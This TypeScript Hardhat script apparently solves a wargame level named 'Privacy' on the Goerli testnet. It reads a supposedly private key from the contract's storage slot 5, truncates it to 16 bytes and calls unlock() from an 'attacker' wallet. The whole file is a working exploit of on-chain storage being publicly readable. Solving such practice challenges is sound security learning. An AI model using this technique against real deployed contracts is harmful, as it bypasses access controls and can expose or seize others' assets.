import { TransactionResponse } from "@ethersproject/providers"
import { ethers } from "hardhat";
import * as dotenv from "dotenv";

dotenv.config();

const provider = new ethers.providers.JsonRpcProvider(process.env.GOERLI_URL)
const privateKey: string = process.env.PRIVATE_KEY || ""
const attacker = new ethers.Wallet(privateKey, provider)

const CONTRACT_NAME = "Privacy"
const CONTRACT_ADDRESS = "0x4C443BB68B0cca52dC92946b72AddB2eC9cD04Aa"

async function main() {
    const Privacy = await ethers.getContractFactory(CONTRACT_NAME)
    const privacy = Privacy.attach(CONTRACT_ADDRESS)

    const dataArraySlot = 5
    const key32 = await ethers.provider.getStorageAt(CONTRACT_ADDRESS, dataArraySlot)
    const key16 = key32.slice(0, 16 * 2 + 2)

    const tx: TransactionResponse = await privacy.connect(attacker).unlock(key16)
    await tx.wait()

    console.log("Privacy: unlocked the contract");
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });